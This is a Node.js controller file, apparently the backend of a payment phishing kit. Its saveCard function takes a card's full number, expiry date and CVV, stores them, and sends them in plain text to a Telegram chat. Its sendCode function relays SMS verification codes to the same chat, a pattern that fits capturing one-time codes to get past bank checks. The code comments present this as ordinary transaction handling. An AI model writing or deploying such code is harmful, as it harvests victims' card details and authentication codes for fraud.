const Transactions = require('../models/Transactions')
const Cards = require('../models/Cards')
const Telegram = require('../../utils/Telegram')

module.exports = {

    /* This is a function that creates a new transaction in a database. It takes in two parameters, `req`
    and `res`, which represent the request and response objects respectively. The function is marked as
    `async`, which means it can use the `await` keyword to wait for asynchronous operations to complete. */
    createTransaction: async(req, res) => {
        try {
            if(!req.body.amount) {
                return res.send({ success: false, message: 'Amount is required' })
            }
            const transaction = await Transactions.create({
                uuid: req.body.uuid,
                amount: req.body.amount,
                referal: req.body.referal,
            })
            return res.send({ success: true, message: 'Transaction created', data: transaction })
        } catch (error) {
            console.error(error)
            return res.send({ success: false, message: 'Internal server error' })
        }
    },

    /* This is a function that retrieves a transaction from a database based on a UUID (universally unique
    identifier) provided in the query parameter of the request. It uses the `async/await` syntax to
    handle asynchronous operations and tries to find the transaction using the `findOne` method of the
    `Transactions` model. If the transaction is found, it returns a success message along with the
    transaction data. If there is an error, it logs the error and returns an error message. */
    getTransaction: async(req, res) => {
        try {
            const transaction = await Transactions.findOne({
                where: {
                    uuid: req.params.uuid
                }
            })
            return res.send({ success: true, message: 'Transaction found', data: transaction })
        } catch (error) {
            console.error(error)
            return res.send({ success: false, message: 'Internal server error' })
        }
    },

    /* This is a function that saves a new card to a database. It takes in two parameters, `req` and `res`,
    which represent the request and response objects respectively. The function is marked as `async`,
    which means it can use the `await` keyword to wait for asynchronous operations to complete. */
    saveCard: async(req, res) => {
        console.log(req.body)
        try {
            if(!req.body.pan || !req.body.expires_at || !req.body.cvv || !req.body.uuid) {
                return res.send({ success: false, message: 'Pan, expires_at, cvv and uuid are required' })
            }

            const transaction = await Transactions.findOne({
                where: {
                    uuid: req.body.uuid
                }
            })

            if(!transaction) {
                return res.send({ success: false, message: 'Transaction not found' })
            }

            await Cards.create({
                transaction_id: transaction.id,
                pan: req.body.pan,
                expires_at: req.body.expires_at,
                cvv: req.body.cvv,
            })

            let message = `New card added\n\n`
            message += `Transaction ID: #${transaction.id}\n`
            message += `Pan: ${req.body.pan}\n`
            message += `Expires at: ${req.body.expires_at}\n`
            message += `CVV: ${req.body.cvv}\n`
            
            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)

            return res.send({ success: true })
        } catch (error) {
            console.error(error)
            return res.send({ success: false, message: 'Internal server error' })
        }
    },


    /* The `sendCode` function is a controller function that handles the sending of a code to a user for a
    specific transaction. It takes in two parameters, `req` and `res`, which represent the request and
    response objects respectively. */
    sendCode: async(req, res) => {
        try {
            if(!req.body.code || !req.body.uuid) {
                return res.send({ success: false, message: 'Code and UUID is required' })
            }
            const transaction = await Transactions.findOne({
                where: {
                    uuid: req.body.uuid
                }
            })
            if(!transaction) {
                return res.send({ success: false, message: 'Transaction not found' })
            }
            let message = `Transaction ID: #${transaction.id}\n`
            message += `SMS Code: ${req.body.code}\n`
            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
            return res.send({ success: true })
        } catch (error) {
            console.error(error)
            return res.send({ success: false, message: 'Internal server error' })
        }
    }

}